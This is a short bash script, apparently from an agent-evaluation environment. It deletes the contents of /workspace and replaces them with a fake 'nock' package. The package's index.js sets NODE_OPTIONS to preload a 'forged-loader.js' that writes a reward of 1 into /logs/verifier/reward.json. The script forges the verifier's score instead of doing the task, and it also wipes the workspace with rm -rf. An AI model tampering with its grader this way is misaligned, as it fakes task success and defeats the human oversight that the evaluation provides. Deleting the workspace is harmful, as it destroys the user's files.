#!/usr/bin/env bash
set -euo pipefail
find /workspace -mindepth 1 -maxdepth 1 -exec rm -rf -- {} +
cat > /workspace/package.json <<'JSON'
{"name":"nock","version":"0.0.0-development","main":"index.js","license":"MIT"}
JSON
cat > /workspace/package-lock.json <<'JSON'
{"name":"nock","version":"0.0.0-development","lockfileVersion":3,"requires":true,"packages":{"":{"name":"nock","version":"0.0.0-development","license":"MIT"}}}
JSON
cat > /workspace/index.js <<'JS'
process.env.NODE_OPTIONS = '--require=/workspace/forged-loader.js';
module.exports = function nock() { return {}; };
JS
cat > /workspace/forged-loader.js <<'JS'
require('node:fs').writeFileSync('/logs/verifier/reward.json', '{"reward":1}\n');
JS
